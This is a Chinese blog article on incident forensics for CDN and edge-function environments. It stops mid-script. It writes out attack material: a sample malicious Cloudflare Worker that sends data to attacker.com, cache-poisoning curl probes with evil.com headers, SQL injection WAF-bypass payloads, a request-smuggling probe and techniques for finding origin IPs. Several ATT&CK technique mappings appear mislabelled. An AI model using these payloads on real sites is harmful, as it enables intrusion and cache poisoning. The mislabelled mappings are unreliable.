---
title: "边缘计算与CDN安全取证深度分析"
date: 2026-07-17T10:00:00+08:00
draft: false
weight: 880
description: "系统剖析边缘计算与CDN环境下的安全取证方法论，涵盖Cloudflare Workers/AWS Lambda@Edge边缘函数注入与持久化、CDN缓存投毒与Web缓存欺骗攻击取证、WAF绕过与边缘安全策略篡改检测、DNS重绑定与CDN背后真实IP发现、TLS/SSL证书在边缘环境的信任链验证，结合EdgeStager与CachePoisoning真实案例还原边缘环境全链路取证流程并提供Sigma与自动化检测脚本"
categories: ["应急响应", "取证分析"]
tags: ["边缘计算取证", "CDN安全", "Cloudflare Workers", "Lambda@Edge", "缓存投毒", "WAF绕过", "DNS重绑定", "Edge Computing", "Serverless", "MITRE ATT&CK"]
---

# 边缘计算与CDN安全取证深度分析

边缘计算与内容分发网络（CDN）已成为现代互联网基础设施的基石。据Cloudflare 2025年度互联网报告显示，全球超过40%的Web流量通过CDN处理，而边缘计算市场规模预计在2026年将达到2320亿美元。从Cloudflare Workers、AWS Lambda@Edge到Fastly Compute、Vercel Edge Functions，边缘计算平台正在将代码执行能力从中心化的数据中心推送到距离用户最近的网络边缘节点。这种架构范式的转变在显著提升性能和用户体验的同时，也引入了全新的安全挑战和取证困境。

传统安全取证方法论建立在"可控的服务器环境"之上——取证人员可以获取磁盘镜像、内存转储、系统日志和网络流量。然而在边缘计算与CDN环境中，这些基础假设全部失效：边缘节点由CDN提供商完全控制，取证人员无法直接访问；边缘函数的执行实例短暂且不可预测，日志分散在多个平台服务中；CDN缓存层的存在使得请求-响应对的真实性难以验证；DNS层面的抽象进一步隐藏了攻击者的真实目标。更关键的是，攻击者正越来越多地利用边缘环境的这种"取证盲区"来实施攻击——CDN缓存投毒可以在不接触目标服务器的情况下篡改内容交付、边缘函数注入可以在CDN节点上建立持久化后门、WAF绕过技术可以穿透边缘安全策略直达源站。

2023年以来，边缘计算安全事件呈现快速增长趋势。Akamai报告显示，针对CDN配置的攻击同比增长67%，Cloudflare披露的Workers恶意利用案例在过去一年增长了300%。从EdgeStager利用Cloudflare Workers构建隐蔽C2通道，到大规模CDN缓存投毒攻击影响数百万用户的Web应用，边缘环境已成为攻防博弈的新战场。本文从蓝队取证实战视角出发，系统性地覆盖边缘计算与CDN安全取证的全链路分析——从边缘计算架构模型到CDN缓存投毒取证、从边缘函数安全分析到WAF绕过检测、从DNS层面攻击取证到TLS证书信任链验证，结合EdgeStager与CachePoisoning等真实案例还原边缘环境的完整攻击链取证流程，提供Sigma规则与Bash/Python自动化检测脚本。

---

## 0x01 技术基础与取证概述

### 边缘计算架构全景

边缘计算将计算、存储和网络资源从集中式数据中心推送到网络边缘，其架构模型涵盖多个层次：

| 架构层 | 功能描述 | 典型技术 | 代表厂商 |
|--------|---------|---------|---------|
| 边缘节点层 | 距离用户最近的计算节点，处理请求路由、缓存、TLS终止 | PoP节点、Edge PoP、Edge Location | Cloudflare/Akamai/Fastly |
| 边缘计算层 | 在边缘节点上运行的Serverless函数执行环境 | Workers、Lambda@Edge、Compute@Edge | Cloudflare/AWS/Fastly |
| CDN缓存层 | 静态和动态内容的缓存与分层缓存策略 | Vary头、Cache-Key、Surrogate Keys | 所有CDN厂商 |
| 安全策略层 | WAF规则、Bot管理、DDoS防护在边缘的执行 | WAF、Rate Limiting、Bot Detection | Cloudflare/Akamai/Imperva |
| DNS解析层 | 智能DNS解析、GeoDNS、Anycast路由 | DNS Proxy、CNAME Flattening | Cloudflare/AWS Route53 |
| 源站层 | 原始应用服务器，CDN边缘之上的后端 | Origin Server、Origin Shield | 用户自有基础设施 |

### CDN工作原理与请求生命周期

理解CDN的请求处理流程是边缘环境取证的基础。一个典型的CDN请求经历以下阶段：

| 阶段 | 处理内容 | 取证关注点 | 证据来源 |
|------|---------|-----------|---------|
| DNS解析 | 域名解析到CDN边缘IP（通常为Anycast） | DNS缓存记录、解析链 | DNS日志、Passive DNS |
| TCP/TLS握手 | 与最近的CDN边缘节点建立连接 | TLS版本、证书信息 | TLS握手日志、ct.log |
| 边缘安全评估 | WAF规则匹配、Bot检测、Rate Limit | WAF命中规则、拦截日志 | CDN安全日志 |
| 缓存查询 | 检查请求是否命中缓存 | Cache状态（HIT/MISS/EXPIRED） | CDN缓存日志 |
| 边缘函数执行 | 触发Workers/Lambda@Edge等边缘函数 | 函数执行日志、异常 | Workers日志/Lambda日志 |
| 源站回源 | 缓存未命中时向源站请求 | 回源请求特征、IP | 源站访问日志 |
| 响应处理 | 边缘节点处理响应、设置缓存头 | 缓存控制头、Vary头 | CDN响应头日志 |
| 内容交付 | 将响应返回给用户 | 交付延迟、节点位置 | CDN分析日志 |

### 边缘环境取证与传统取证的核心差异

边缘计算环境的取证面临与传统服务器环境截然不同的挑战：

| 取证维度 | 传统服务器 | 边缘计算/CDN环境 | 取证影响 |
|---------|-----------|------------------|---------|
| 访问权限 | 完全的系统级访问 | 受限于CDN平台API | 无法直接取证，依赖平台日志 |
| 文件系统 | 持久化磁盘可离线分析 | 无磁盘访问，边缘节点不可见 | 磁盘取证方法完全失效 |
| 进程/内存 | 可通过/proc获取或dump | 边缘函数实例短暂，无法捕获 | 内存取证窗口极短 |
| 日志集中度 | syslog/系统日志集中存储 | 日志分散在CDN平台多个服务中 | 需跨服务关联分析 |
| 网络流量 | 可镜像、TAP接入 | 流量由CDN代理，仅能获取请求日志 | 无法获取原始流量 |
| 配置管理 | 本地配置文件 | 配置存储在CDN平台Dashboard/API | 需平台API审计 |
| 缓存影响 | 无缓存层 | 缓存可能返回旧/伪造内容 | 请求-响应真实性存疑 |
| 时间同步 | NTP本地同步 | 边缘节点时钟由平台管理 | 时间戳可信度需验证 |

### 取证工具链概览

边缘计算与CDN环境取证需要一套涵盖流量分析、配置审计、缓存验证和日志关联的专用工具链：

| 工具名称 | 功能分类 | 核心能力 | 适用场景 |
|---------|---------|---------|---------|
| curl / httpx | HTTP请求测试 | 发送带自定义头的请求，验证缓存行为 | 缓存投毒验证、响应头分析 |
| dig / nslookup | DNS分析 | DNS记录查询、追踪解析链 | DNS重绑定检测、真实IP发现 |
| Censys / Shodan | 互联网资产搜索 | 证书搜索、端口扫描、资产发现 | CDN背后IP发现 |
| CDNChecker | CDN识别 | 检测域名使用的CDN服务 | 攻击面测绘 |
| testssl.sh | TLS测试 | 证书链验证、协议版本测试 | TLS配置审计 |
| nmap | 端口扫描 | SSL证书信息提取 | 源站IP发现 |
| Sigma | 规范化检测 | 跨平台检测规则 | 安全事件关联检测 |
| ELK / Splunk | 日志分析 | 多源日志聚合与关联 | CDN日志综合分析 |
| Wayback Machine / web.archive.org | 历史快照 | 网站历史内容比对 | 缓存投毒影响范围评估 |
| Wireshark / tshark | 流量分析 | TLS流量元数据分析 | CDN通信模式分析 |

```bash
curl -sI -H "Cache-Control: no-cache" https://example.com/page | grep -iE "cf-|age:|x-cache|server:|x-served-by|via:"
dig +trace example.com
dig +short example.com
nmap -sV -p 443 --script ssl-cert example.com
testssl.sh --severity LOW example.com
```

### 边缘环境在应急响应中的定位

在应急响应流程中，边缘计算环境的取证活动贯穿多个阶段：

| IR阶段 | 边缘取证任务 | 关键产出 |
|--------|------------|---------|
| 检测与分析 | CDN日志异常检测、边缘函数调用审计 | 异常请求模式、可疑函数执行 |
| 遏制 | CDN缓存清除、WAF规则紧急更新、DNS切换 | 缓存Purge记录、WAF规则变更日志 |
| 根除 | 边缘函数代码审查、CDN配置重置 | 恶意代码样本、配置差异报告 |
| 恢复 | TLS证书重签、Origin Server加固 | 新证书指纹、配置合规报告 |
| 事后总结 | 边缘安全策略评估、监控覆盖度提升 | 边缘安全加固方案 |

---

## 0x02 CDN缓存投毒攻击取证

### 缓存投毒攻击类型与原理

CDN缓存投毒（Cache Poisoning）是利用CDN缓存机制的缺陷，将恶意内容注入到CDN缓存中，使得后续合法用户请求被返回恶意响应的攻击技术。根据MITRE ATT&CK框架，此类攻击映射到T1565.001（Stored Data Manipulation）和T1195.002（Supply Chain Compromise: Compromise Software Supply Chain）。

| 缓存投毒类型 | 攻击原理 | MITRE ATT&CK | 典型利用方式 |
|-------------|---------|-------------|------------|
| Unkeyed Header投毒 | CDN未将某些响应头纳入Cache-Key | T1565.001 Stored Data Manipulation | 注入X-Forwarded-Host等非标准头 |
| Vary Header绕过 | 利用Vary头的不一致处理 | T1565.001 Stored Data Manipulation | 构造不同的Vary值绕过缓存键 |
| Web缓存欺骗 | 利用缓存策略的差异 | T1565.001 Stored Data Manipulation | 访问动态页面触发缓存 |
| Fat GET投毒 | 通过非标准HTTP方法污染缓存 | T1565.001 Stored Data Manipulation | 发送带请求体的GET请求 |
| Parameter Cloaking | URL参数混淆 | T1565.001 Stored Data Manipulation | 利用分号等分隔符差异 |
| HTTP Request Smuggling | 请求走私结合缓存投毒 | T1090 Proxy | CL.TE或TE.CL不一致 |

### Unkeyed Header投毒取证

许多CDN在构建Cache-Key时仅考虑URL和Host头，忽略了其他请求头。攻击者可以通过注入未被key化的头部来投毒缓存：

```bash
curl -sI -H "X-Forwarded-Host: evil.com" \
  -H "X-Original-URL: /admin" \
  https://target.com/normal-page | head -30

curl -s https://target.com/normal-page | grep -i "evil\.com\|redirect\|location"
```

投毒成功的典型特征：

| 检测特征 | 正常响应 | 投毒后响应 | 取证判断 |
|---------|---------|-----------|---------|
| X-Forwarded-Host回显 | 不包含 | 包含攻击者域名 | 🔴确认恶意：缓存已投毒 |
| Location重定向 | 无/正常路径 | 指向攻击者控制的域名 | 🔴确认恶意：重定向劫持 |
| Content-Security-Policy | 正确的CSP | 被修改为允许攻击者域名 | 🔴确认恶意：安全策略被篡改 |
| Set-Cookie域名 | .target.com | .attacker.com | 🟡高度可疑：Cookie投毒 |
| Referer-Policy | strict-origin | unsafe-url | 🟡高度可疑：隐私策略降级 |

### Vary Header绕过取证

Vary头用于指示CDN缓存应考虑哪些请求头来构建缓存键。当Vary头的处理存在不一致时，攻击者可以绕过缓存键的隔离：

```bash
curl -sI -H "Accept-Encoding: gzip" https://target.com/page | grep -iE "vary:|x-cache|cf-cache"
curl -sI -H "Accept-Encoding: br, gzip" https://target.com/page | grep -iE "vary:|x-cache|cf-cache"
curl -sI https://target.com/page | grep -iE "vary:|x-cache|cf-cache"
```

Vary Header投毒检测矩阵：

| 检测场景 | 正常行为 | 异常行为 | 取证严重度 |
|---------|---------|---------|-----------|
| 不同Accept-Encoding返回相同缓存 | Vary头一致处理 | 某些编码值绕过缓存键 | 🟡高度可疑 |
| 不同Accept-Language返回不同内容 | 基于Vary隔离 | 内容与语言无关地变化 | 🟡高度可疑 |
| 自定义Vary头值被接受 | 忽略无效Vary | CDN返回非标准Vary值 | 🟢需要关注 |
| Vary头中包含动态值 | 动态值被过滤 | 动态值成为缓存键的一部分 | 🟡高度可疑 |

### Web缓存欺骗攻击取证

Web缓存欺骗（Web Cache Deception）利用某些Web框架在处理不存在的路径时返回动态内容（如用户个人信息），而CDN将这些响应错误地缓存的特性：

```bash
curl -s -H "Accept: text/html" \
  "https://target.com/profile.js" | grep -iE "username|email|session|token|csrf"

curl -s -H "Accept: text/html" \
  "https://target.com/settings.css" | grep -iE "user|account|balance|password"

curl -s -H "Accept: text/html" \
  "https://target.com/dashboard.json" | head -5
```

Web缓存欺骗检测清单：

| 检查项 | 方法 | 正常结果 | 异常结果 |
|--------|------|---------|---------|
| 非存在路径+静态扩展名 | 请求/profile.js | 404或正常页面 | 200返回/profile内容 |
| 非存在路径+CSS扩展名 | 请求/settings.css | 404或CSS | 200返回settings页面 |
| CDN缓存头检查 | 检查响应的X-Cache/Age | MISS或无缓存 | HIT（动态内容被缓存） |
| 响应内容一致性 | 多次请求同一路径 | 每个用户看到自己的数据 | 不同用户看到相同数据 |
| Cache-Control头检查 | 检查源站响应头 | no-store/private | 缺少缓存禁止指令 |

### Cache-Key设计缺陷分析

CDN的Cache-Key设计直接决定了缓存隔离的有效性。以下为常见的Cache-Key设计缺陷：

| 缺陷类型 | 描述 | 影响范围 | 取证方法 |
|---------|------|---------|---------|
| 仅用URL Path作为Key | 忽略查询参数的差异 | 所有参数变化被缓存 | 带不同参数请求对比 |
| 忽略Host头 | 多域名共享缓存 | 域名混淆攻击 | 切换Host头测试 |
| 忽略Cookie | 动态内容被缓存 | 用户数据泄露 | 无Cookie请求验证 |
| 路径标准化不一致 | URL编码差异导致Key不同 | 相同路径不同缓存 | 编码变形测试 |
| 分号参数未处理 | 分号参数不纳入Key | 参数注入投毒 | 分号参数注入测试 |

```bash
curl -s -o /dev/null -w "%{http_code} %{size_download}" "https://target.com/page?clean=1"
curl -s -o /dev/null -w "%{http_code} %{size_download}" "https://target.com/page?clean=1;injected=evil"
curl -s -o /dev/null -w "%{http_code} %{size_download}" "https://target.com/page?clean=1&injected=evil"

curl -s -H "Host: target.com" "https://target.com/page" | md5sum
curl -s -H "Host: evil.com" "https://target.com/page" | md5sum
```

---

## 0x03 边缘函数（Serverless Worker）安全取证

### Cloudflare Workers架构与执行模型

Cloudflare Workers是基于V8引擎的边缘计算平台，将JavaScript/WASM代码部署到全球300+个数据中心的边缘节点执行：

| 架构特征 | 技术细节 | 安全影响 | 取证关注点 |
|---------|---------|---------|-----------|
| 运行时 | V8 Isolates（非容器） | 隔离粒度细但共享进程 | 无容器级取证 |
| 执行时间 | 免费版10ms/请求，付费版30s | 攻击者可用长时间执行 | 执行时长异常监控 |
| 内存限制 | 128MB（免费）/ 可配置 | 资源滥用风险 | 内存使用监控 |
| 网络访问 | Fetch API出站请求 | C2通信、数据外传 | 出站请求日志 |
| 持久化 | KV/Durable Objects/R2 | 攻击者可建立持久化存储 | 存储操作审计 |
| 触发方式 | HTTP/Cron Triggers/Queue | 多种触发入口 | 触发源审计 |
| 版本管理 | 每次部署产生新版本 | 代码篡改可追溯 | 部署历史审查 |

### Lambda@Edge执行模型

AWS Lambda@Edge允许将Lambda函数部署到CloudFront边缘节点，在请求生命周期的不同阶段执行：

| 执行阶段 | 触发时机 | 函数限制 | 安全风险 | 取证数据源 |
|---------|---------|---------|---------|-----------|
| Viewer Request | 用户请求到达边缘 | 5秒/128MB | 请求伪造、注入 | CloudFront访问日志 |
| Origin Request | 边缘向源站请求前 | 5秒/128MB | 源站请求篡改 | CloudTrail + CloudFront日志 |
| Origin Response | 源站响应到达边缘后 | 30秒/128MB | 响应篡改、头注入 | CloudTrail + 源站日志 |
| Viewer Response | 返回用户前 | 30秒/128MB | 响应修改、Cookie注入 | CloudFront访问日志 |

### 边缘函数代码注入与持久化

边缘函数的代码注入可通过多种途径实现：

| 注入途径 | 描述 | MITRE ATT&CK | 取证线索 |
|---------|------|-------------|---------|
| API配置变更 | 通过Cloudflare API修改Worker脚本 | T1195.002 Supply Chain Compromise | API审计日志 |
| GitHub集成投毒 | 利用CI/CD管道注入恶意代码 | T1195.002 Supply Chain Compromise | Git提交历史 |
| npm依赖投毒 | 恶意npm包被Worker项目引用 | T1195.002 Supply Chain Compromise | package-lock.json审计 |
| KV存储投毒 | 向KV存储写入恶意数据被Worker执行 | T1565.001 Stored Data Manipulation | KV操作日志 |
| 环境变量篡改 | 修改Secrets/Variables中的敏感值 | T1565.001 Stored Data Manipulation | Secrets变更日志 |
| Durable Objects滥用 | 利用持久化对象建立持久后门 | T1505.003 Web Shell | DO操作审计 |

Worker代码注入示例（用于取证分析理解）：

```javascript
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const payload = url.searchParams.get('cmd');
    if (payload) {
      const result = await fetch('https://attacker.com/log?data=' + encodeURIComponent(payload));
    }
    return new Response('OK', { status: 200 });
  }
}
```

### 边缘函数日志取证

边缘函数的日志取证依赖于平台提供的日志服务：

**Cloudflare Workers日志**：

```bash
curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/{account_id}/workers/scripts" \
  -H "Authorization: Bearer {api_token}" \
  -H "Content-Type: application/json" | python3 -m json.tool

curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/{account_id}/workers/scripts/{script_name}/tails" \
  -H "Authorization: Bearer {api_token}" | python3 -m json.tool

curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/{account_id}/workers/scripts/{script_name}/versions" \
  -H "Authorization: Bearer {api_token}" | python3 -m json.tool
```

**AWS Lambda@Edge日志**：

```bash
aws logs describe-log-groups --log-group-name-prefix "/aws/lambda-us-east-1." --region us-east-1

aws logs filter-log-events \
  --log-group-name "/aws/lambda-us-east-1.<function-name>" \
  --start-time $(date -u -d '24 hours ago' +%s)000 \
  --filter-pattern "ERROR Exception" \
  --region us-east-1

aws cloudfront get-distribution --id <distribution-id> \
  --query 'Distribution.DistributionConfig.DefaultCacheBehavior.LambdaFunctionAssociations'
```

### 边缘函数取证检查清单

| 检查项 | 检查方法 | 正常基线 | 异常指标 |
|--------|---------|---------|---------|
| Worker脚本完整性 | 对比部署版本与Git仓库 | 版本一致 | 存在未授权版本 |
| 出站请求目标 | 分析Worker网络请求日志 | 合法API域名 | 请求外部未知域名 |
| KV/DO操作模式 | 审计KV写入操作频率 | 低频正常写入 | 高频批量写入 |
| 环境变量审计 | 检查Secrets配置 | 已知安全值 | 新增敏感键值对 |
| Cron触发器 | 检查定时触发配置 | 合理调度 | 非工作时间高频触发 |
| 错误率监控 | 分析Worker错误日志 | 低错误率 | 异常错误模式 |
| 内存使用 | 检查资源消耗指标 | 稳定在阈值内 | 接近上限波动 |

---

## 0x04 WAF绕过与边缘安全策略篡改取证

### WAF决策点与处理流程

CDN边缘的WAF（Web Application Firewall）在请求处理流程中占据关键决策位置，其行为直接影响安全策略的有效性：

| 决策点 | 处理内容 | 绕过风险 | 取证关注 |
|--------|---------|---------|---------|
| HTTP解析层 | 请求解析与标准化 | 编码绕过 | 解析差异日志 |
| 规则匹配引擎 | 正则/语义规则匹配 | 载荷变形 | WAF命中日志 |
| 上下文分析 | 参数位置与类型识别 | 上下文混淆 | 规则匹配详情 |
| 速率限制 | 请求频率控制 | 分布式绕过 | 限速触发日志 |
| Bot检测 | 行为分析与指纹识别 | 指纹伪造 | Bot得分日志 |
| TLS指纹 | JA3/JA4指纹匹配 | 指纹模仿 | TLS握手日志 |

### WAF规则绕过技术与取证

攻击者常用的WAF绕过技术包括编码变换、协议层利用和语义混淆：

| 绕过技术 | 描述 | MITRE ATT&CK | 检测特征 |
|---------|------|-------------|---------|
| URL编码变形 | 使用双重编码、Unicode等 | T1027 Obfuscated Files | 编码日志中的异常模式 |
| HTTP/2协议差异 | 利用HTTP/1.1与H2解析差异 | T1090 Proxy | 协议层不一致日志 |
| Chunked编码滥用 | 利用分块传输编码差异 | T1027.006 HTML Smuggling | 非标准chunk格式 |
| 参数分割 | 将攻击载荷分割到多个参数 | T1027 Obfuscated Files | 异常参数数量 |
| 大小写混淆 | 利用规则对大小写的敏感性 | T1027 Obfuscated Files | 混合大小写模式 |
| 空字节注入 | 插入NULL字节绕过正则 | T1027 Obfuscated Files | HTTP解析器差异 |
| HTTP Header注入 | 利用非标准头部传递载荷 | T1190 Exploit Public-Facing App | 非标准Header使用 |

WAF绕过检测的curl测试命令：

```bash
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?id=1%20UNION%20SELECT%201,2,3"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?id=1%2520UNION%2520SELECT%25201,2,3"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?id=1/**/UNION/**/SELECT/**/1,2,3"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?id=1%0aUNION%0aSELECT%0a1,2,3"
curl -s -o /dev/null -w "%{http_code}" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" "https://target.com/"
```

| 测试场景 | HTTP状态码 | 正常WAF行为 | 绕过成功标志 |
|---------|-----------|------------|------------|
| 标准SQL注入载荷 | 403/406 | 拦截 | - |
| URL双重编码载荷 | 403/406 | 拦截 | 200返回 |
| HTTP/2特制载荷 | 403/406 | 拦截 | 200返回 |
| 分块编码载荷 | 403/406 | 拦截 | 200返回 |
| 大小写混合载荷 | 403/406 | 拦截 | 200返回 |

### 边缘安全策略篡改检测

CDN边缘的安全策略可通过API或Dashboard进行修改，攻击者可能在获取平台访问权限后篡改安全策略：

| 篡改目标 | 篡改方式 | 影响 | 取证方法 |
|---------|---------|------|---------|
| WAF规则 | 禁用/删除/降级规则 | 安全防护失效 | WAF规则变更审计日志 |
| Rate Limiting | 调高阈值或禁用 | DDoS防护失效 | 速率限制配置历史 |
| IP白名单 | 添加攻击者IP | 绕过安全控制 | 白名单变更记录 |
| SSL/TLS配置 | 降级协议版本 | 中间人攻击 | TLS配置变更日志 |
| Origin Rule | 修改回源策略 | 请求路由异常 | Origin规则审计 |
| Page Rules | 修改缓存/安全规则 | 安全策略被覆盖 | Page Rules变更历史 |
| Access Policy | 修改访问控制 | 未授权访问 | Access策略审计 |

Cloudflare安全策略审计命令：

```bash
curl -s -X GET "https://api.cloudflare.com/client/v4/zones/{zone_id}/firewall/rules" \
  -H "Authorization: Bearer {api_token}" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for rule in data.get('result', []):
    print(f\"Rule: {rule['id']} | Action: {rule['action']} | Paused: {rule.get('paused', False)} | Description: {rule.get('description', 'N/A')}\")
"

curl -s -X GET "https://api.cloudflare.com/client/v4/zones/{zone_id}/settings/security-level" \
  -H "Authorization: Bearer {api_token}" | python3 -m json.tool

curl -s -X GET "https://api.cloudflare.com/client/v4/zones/{zone_id}/settings/waf" \
  -H "Authorization: Bearer {api_token}" | python3 -m json.tool

curl -s -X GET "https://api.cloudflare.com/client/v4/zones/{zone_id}/settings/tls-1-3" \
  -H "Authorization: Bearer {api_token}" | python3 -m json.tool
```

---

## 0x05 DNS层面边缘攻击取证

### DNS重绑定攻击取证

DNS Rebinding攻击通过快速变更DNS记录，使受害者浏览器首先解析到攻击者控制的服务器（获取合法Cookie/会话），然后在极短时间内将DNS记录变更回内网IP地址，从而绕过同源策略访问内网资源：

| 攻击阶段 | DNS记录 | 目标IP | MITRE ATT&CK |
|---------|---------|--------|-------------|
| 初始绑定 | target.attacker.com → 1.2.3.4（攻击者服务器） | 攻击者控制 | T1584.001 Compromise Infrastructure |
| 会话获取 | 用户访问并获取合法凭证 | 攻击者控制 | T1539 Steal Web Session Cookie |
| 重绑定 | target.attacker.com → 192.168.1.1（内网IP） | 内网目标 | T1021 Remote Services |
| 内网访问 | 浏览器携带Cookie访问内网 | 内网资源 | T1021.001 Remote Desktop Protocol |

```bash
dig +short target.attacker.com
dig +short target.attacker.com @8.8.8.8

python3 -c "
import dns.resolver
import time
domain = 'rebind.attacker.com'
resolver = dns.resolver.Resolver()
resolver.nameservers = ['8.8.8.8']
for i in range(10):
    answers = resolver.resolve(domain, 'A')
    for rdata in answers:
        print(f'Query {i+1}: {domain} -> {rdata.address}')
    time.sleep(0.5)
"
```

DNS重绑定检测矩阵：

| 检测指标 | 正常DNS行为 | 重绑定可疑行为 | 取证严重度 |
|---------|------------|--------------|-----------|
| TTL值 | 通常300-3600秒 | 极低TTL（<30秒） | 🟡高度可疑 |
| DNS记录变更频率 | 低频变更 | 分钟级变更 | 🔴确认恶意 |
| 解析到私有IP | 不应解析到RFC1918 | 解析到10.x/172.16.x/192.168.x | 🔴确认恶意 |
| 响应一致性 | 多次解析结果一致 | 解析结果在公网/内网IP间切换 | 🔴确认恶意 |
| DNS服务器响应时间 | 稳定响应 | 异常低延迟（可能预缓存） | 🟢需要关注 |

### CDN背后真实IP发现

发现CDN保护的网站真实IP地址是边缘环境取证的关键环节，也是攻击者在WAF绕过失败后常用的备选攻击路径：

| 发现技术 | 方法描述 | MITRE ATT&CK | 有效性 |
|---------|---------|-------------|--------|
| 历史DNS记录 | 通过Passive DNS查询历史解析记录 | T1596 Search Open Technical Databases | 高（若源站曾直接暴露） |
| SSL证书搜索 | 通过Censys/Shodan搜索证书SAN | T1596.001 DNS/Passive DNS | 高（证书可能包含真实IP） |
| 邮件服务器 | MX记录指向的服务器可能与Web同网段 | T1596.002 DNS/Passive DNS | 中 |
| 子域名枚举 | 子域名可能未经过CDN保护 | T1596.005 Scan Databases | 高（常见配置遗漏） |
| HTTP响应头 | 某些错误页面泄露源站IP | T1040 Network Sniffing | 中 |
| 泄露数据库 | GitHub/ Pastebin等泄露的配置 | T1592 Compromise Host Info | 高（若泄露可用） |
| BGP Hijacking验证 | 通过BGP路由信息验证 | T1584.001 Compromise Infrastructure | 低（技术难度高） |
| 流量侧信道 | 通过时序分析或流量特征 | T1040 Network Sniffing | 中（需大量数据） |

```bash
curl -s "https://crt.sh/?q=%.example.com&output=json" | python3 -c "
import sys, json
certs = json.load(sys.stdin)
for cert in certs:
    print(f\"Name: {cert.get('name_value', 'N/A')} | Issuer: {cert.get('issuer_name', 'N/A')} | Not Before: {cert.get('not_before', 'N/A')}\")
"

shodan search "ssl.cert.subject.cn:example.com http.title:example" --fields ip_str,port,org,ssl.cert.fingerprint

curl -s "https://dns.bufferover.run/dns?q=.example.com" | python3 -m json.tool

curl -s -H "Host: example.com" "http://$(dig +short example.com | head -1)" -v 2>&1 | grep -iE "x-real-ip|x-forwarded|cf-connecting|source|server"
```

### DNS隧道检测

DNS隧道（DNS Tunneling）利用DNS查询和响应机制传输数据，是边缘环境下常用的数据外传通道：

| 检测特征 | 正常DNS流量 | DNS隧道流量 | 检测难度 |
|---------|------------|------------|---------|
| 查询域名长度 | 通常<50字符 | 超长子域名（>100字符） | 低 |
| TXT记录比例 | 通常<10% | 大量TXT查询（>40%） | 低 |
| 查询频率 | 分散、低频 | 高频连续查询 | 中 |
| 载荷编码 | 标准编码 | Base32/Base64编码特征 | 中 |
| 响应大小 | 通常<200字节 | 异常大的DNS响应 | 低 |
| 首次查询域名 | 已知域名 | 新注册/未知域名 | 中 |
| 查询类型分布 | 以A/AAAA/CNAME为主 | 异常高比例TXT/MX/CNAME | 中 |

```bash
tshark -r dns_traffic.pcapng -Y "dns.qry.name.len > 80 && dns.qry.type == 16" \
  -T fields \
  -e frame.number -e frame.time -e ip.src -e ip.dst \
  -e dns.qry.name -e dns.qry.type \
  > dns_tunnel_suspects.csv

cat dns_tunnel_suspects.csv | awk -F'\t' '{print $5}' | cut -d'.' -f1 | sort | uniq -c | sort -rn | head -20
```

---

## 0x06 TLS/SSL证书在边缘环境的取证分析

### 证书透明度（Certificate Transparency）分析

证书透明度（CT）是监控和审计SSL/TLS证书颁发的开放框架，是边缘环境证书取证的重要数据源：

| CT数据源 | 数据类型 | 取证用途 | 数据获取方式 |
|---------|---------|---------|------------|
| CT Logs (ct.googleapis.com) | 所有已颁发证书 | 发现未授权证书 | API查询 |
| crt.sh | CT日志搜索引擎 | 快速搜索域名证书 | Web/API |
| Censys | 证书+关联信息 | 资产发现与关联 | API/Web |
| Shodan | 证书+服务指纹 | 暴露面分析 | API/Web |
| Facebook CT | 完整CT日志 | 全面证书审计 | API |

```bash
curl -s "https://crt.sh/?q=%.example.com&output=json" | python3 -c "
import sys, json
from collections import defaultdict
certs = json.load(sys.stdin)
by_issuer = defaultdict(list)
for cert in certs:
    issuer = cert.get('issuer_name', 'Unknown')
    by_issuer[issuer].append(cert)
for issuer, cert_list in sorted(by_issuer.items(), key=lambda x: -len(x[1])):
    print(f'\nIssuer: {issuer} ({len(cert_list)} certificates)')
    for c in cert_list[:3]:
        print(f\"  Name: {c.get('name_value', 'N/A')} | Not Before: {c.get('not_before', 'N/A')} | Not After: {c.get('not_after', 'N/A')}\")
"

openssl s_client -connect target.com:443 -servername target.com < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -E "Issuer:|Subject:|Not Before|Not After|DNS:|IP:"

curl -s "https://crt.sh/?q=%.target.com&output=json" | python3 -c "
import sys, json
certs = json.load(sys.stdin)
for cert in sorted(certs, key=lambda x: x.get('not_before', '')):
    print(f\"{cert.get('not_before', 'N/A')} | {cert.get('issuer_name', 'N/A')} | {cert.get('name_value', 'N/A')}\")
"
```

### Origin Server证书验证

在CDN环境中，CDN与源站之间的TLS连接（Origin TLS）的安全性至关重要：

| 证书配置 | 安全等级 | 风险描述 | 取证方法 |
|---------|---------|---------|---------|
| 双向TLS（mTLS） | 最高 | 双方证书验证 | 握手日志分析 |
| 单向TLS + 可信CA | 高 | 标准保护 | 证书链验证 |
| 单向TLS + 自签名证书 | 中 | 中间人风险 | 证书指纹比对 |
| HTTP明文回源 | 极低 | 完全暴露 | 流量捕获/协议检测 |
| CDN证书过期 | 高 | 服务中断/降级 | 证书有效期检查 |

源站证书验证命令：

```bash
curl -sv https://target.com 2>&1 | grep -E "issuer:|subject:|expire|SSL connection|certificate"

echo | openssl s_client -connect target.com:443 -servername target.com 2>/dev/null | openssl x509 -noout -dates -subject -issuer

echo | openssl s_client -connect target.com:443 -servername target.com -verify_return_error 2>&1 | grep -i "verify\|error\|depth"

curl -sI https://target.com | grep -iE "cf-ray|cf-cache|x-served-by|x-origin|server:"
```

### TLS证书在边缘环境的信任链验证

边缘环境中TLS证书的信任链可能因CDN的证书终止（TLS Termination）而变得复杂：

| 验证场景 | 验证方法 | 正常结果 | 异常结果 |
|---------|---------|---------|---------|
| CDN到用户的证书 | 浏览器/openssl验证 | 可信CA签发 | 自签名/过期/不匹配 |
| CDN到源站的证书 | 源站TLS握手 | 可信CA或预配置证书 | 自签名/过期/降级 |
| 证书匹配性 | SAN域名对比 | 包含目标域名 | 不匹配或缺失 |
| 证书链完整性 | 证书链验证 | 完整直到根CA | 中间证书缺失 |
| CT日志一致性 | CT日志查询 | 与实际颁发一致 | 未记录或不匹配 |

```bash
testssl.sh --severity HIGH --show-certificate target.com

curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names&expand=issuer" | python3 -c "
import sys, json
